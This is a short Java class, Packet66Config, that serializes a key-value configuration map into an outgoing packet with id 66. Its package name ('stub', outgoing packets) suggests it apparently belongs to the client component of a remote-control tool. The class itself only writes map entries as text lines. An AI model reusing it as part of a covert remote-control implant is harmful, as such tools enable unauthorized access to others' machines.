package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.util.Map;

import com.redpois0n.common.io.StringWriter;

public class Packet66Config extends AbstractOutgoingPacket {
	
	private Map<String, String> config;
	
	public Packet66Config(Map<String, String> config) {
		this.config = config;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(config.size());
		
		for (String key : config.keySet()) {
			sw.writeLine(key + "=" + config.get(key));
		}
	}

	@Override
	public byte getPacketId() {
		return 66;
	}

}
